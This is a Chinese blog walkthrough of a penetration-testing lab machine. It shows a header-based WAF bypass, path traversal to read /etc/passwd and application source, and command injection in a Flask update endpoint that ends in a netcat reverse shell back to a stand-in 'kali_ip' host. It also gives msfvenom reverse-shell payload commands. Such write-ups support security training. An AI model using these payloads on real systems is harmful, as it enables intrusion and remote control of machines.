#  API接口文件包含+命令执行   
原创 道玄安全  道玄网安驿站   2024-09-15 11:20  
  
**“**  
 API接口测试**”**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPA9bic9zzTydWv4XTTHH2NAiamMp8Kxsh4s2lukPuyuwnia3NiaHkiaU8a3JGFhLvNnYvtLvHTFAd91Rw/640?wx_fmt=png&from=appmsg "")  
  
      
看到了，**关注一下**  
不吃亏啊，点个赞转发一下啦，WP看不下去的，可以B站搜：**标松君**  
，UP主录的打靶视频，欢迎关注。顺便宣传一下星球：**重生者安全，**  
 里面每天会不定期更新**OSCP**  
知识点，**车联网**  
，**渗透红队**  
以及**漏洞挖掘工具**  
等信息分享，欢迎加入；以及想挖**SRC逻辑漏洞**  
的朋友，可以私聊。  
  
  
  
  
  
01  
  
—  
  
  
  
API接口  
  
  
    这次遇到API接口测试的靶机，很有启发性！  
首先扫描端口，发现靶机开了22，13337端口，访问13337端口是，发现是一个api管理页面：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiaten9O8d4ox58zyxPo6dWibKfkbbskbF5kvZj21ZqCnMibvrRfglSibHypg/640?wx_fmt=png&from=appmsg "")  
  
根据提示，我可以用GET的方式访问/logs目录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiatehxCwbqHJJ3l66Q1dpgP5ZXEfXWRmRjYUUNHH7bRYSEfeO06uRaoRg/640?wx_fmt=png&from=appmsg "")  
  
但是有WAF，尝试添加XFF头绕过，发现成功回显：  
```
X-Forwarded-For:127.0.0.1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiatyYTPlGbgPAv1HIoBne6L5faZBPlr4eZFsCtGVvu8ptgyw7589rMQYQ/640?wx_fmt=png&from=appmsg "")  
```
Error! No file specified. Use file=/path/to/log/file to access log files
```  
  
根据回显的报错，  
猜测有文件包含漏洞，构造数据包：  
```
GET /logs?file=../../../../../../etc/passwd HTTP/1.1
Host: ip:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Forwarded-For:127.0.0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
成功回显：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiatsPzSGmUia909IJQZEicmQKBP5UibNbiarYtTlgOWibDp5BQ7ibYJQ49ib8Z9Q/640?wx_fmt=png&from=appmsg "")  
  
成功查看到了/etc/passwd，发现一个可登录的用户，看看有没有ssh私钥：  
```
../../../../../../home/clumsyadmin/.ssh/id_rsa
```  
  
没有成功，回到首页，根据/update的提示：  
```
/update
Methods: POST
Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}
```  
  
可以使用clumsyadmin用户上传一个elf的反弹shell，然后使用/restart接口重启app  
  
构造一下包：  
```
POST /update HTTP/1.1
Host: ip:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 64

{"user":"clumsyadmin", "url":"<url of the update to download>"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiataa3Jp5Yib299tSzKy7FcjKvFwUG5DA1rhOdyL02gicfJKfYGiaJq9auTw/640?wx_fmt=png&from=appmsg "")  
  
回显了我们的用户名，那就尝试看看URL的参数能不能加载外链：  
```
{"user":"clumsyadmin", "url":"http://kali_ip/test"} 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiat8CtP7XBFA72EQ1jEPHfeTTjsiby6Z7I06YIeVkzMCAATwQW86TpX93w/640?wx_fmt=png&from=appmsg "")  
  
发现可以，那就生成x86和x64的elf文件(因为不知道靶机是什么系统)，上传上去重启APP看看能不能反弹回来：  
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ip LPORT=80 -f elf > x86.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=80 -f elf > x64.elf
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiatcOAdpC23zRPf8fXuh4tlCdXrC50qgVIMyuXHx7EibtXod4BwyIVPfJw/640?wx_fmt=png&from=appmsg "")  
  
尝试重启APP，但是无论是x86还是x64的都没有成功反弹，回到文件包含的部分，尝试更多的信息收集，  
由于是app，flask和django框架都有app，包含main.py文件发现了源码：  
```
GET /logs?file=main.py HTTP/1.1
Host: ip:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Forwarded-For:127.0.0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
重点观察更新这个函数：  
```
@app.route('/update', methods = ["POST"])
def update():
    if request.headers['Content-Type'] != "application/json":
        return("Invalid content type.")
    else:
        data = json.loads(request.data)
        if data['user'] != "clumsyadmin":
            return("Invalid username.")
        else:
            os.system("curl {} -o /home/clumsyadmin/app".format(data['url']))
            return("Update requested by {}. Restart the software for changes to take
```  
  
发现在使用clumsyadmin用户后，会跳到os.system函数，并且使用了curl这个函数，整个命令执行的语句我们可以控制url的参数，可以尝试参数做命令执行  
```
os.system("curl {} -o /home/clumsyadmin/app".format(data['url']))
```  
  
使用tcpdump嗅探icmp包：  
```
tcpdump -i tun0 icmp
```  
  
注入命令：  
```
POST请求体：
{"user":"clumsyadmin", "url":"http://192.168.x.x/test;ping -c 5 kali_ip;"}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiaticmpsf3Fgb9O9Kd94jrXxo3emSqzADOGWqM3ibIGAZI7psajLzxeibpsA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiatHSDLJdxmse5IFUjZF01WmtxafKMEbgjTCp5Ctw8CJ5UUmZrSDBsDvg/640?wx_fmt=png&from=appmsg "")  
  
发现可以成功命令执行！  
  
那就尝试反弹shell：  
```
POST请求体：
{"user":"clumsyadmin", "url":"http://192.168.x.x/test;busybox nc kali_ip 13337 -e sh;"}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPbDKWLibrSLD5YWWU1zINiatuiaPSIDmvgp2U0KPr1vM9BdHuvEI2h93yNiazPmhVfuyxRnTepibhI0QA/640?wx_fmt=png&from=appmsg "")  
  
成功突破边界！  
  
  
  
  
**更多精彩内容请扫码关注“重生者安全”星球**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPA9bic9zzTydWv4XTTHH2NAeuqcZvqTz0LHiadOuGVcHz49J7Wl5mAkug4yC75PbuErvyuib90R9l8g/640?wx_fmt=png&from=appmsg "")  
  
****  
免责声明：  
### 本人所有文章均为技术分享，均用于防御为目的的记录，所有操作均在实验环境下进行，请勿用于其他用途，否则后果自负。  
  
第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序和工具；明知他人从事危害网络安全的活动，不得为其提供技术支持、广告推广、支付结算等帮助  
  
第十二条：  国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。  
  
任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。  
  
第十三条：  国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。  
  
  
  
  
  
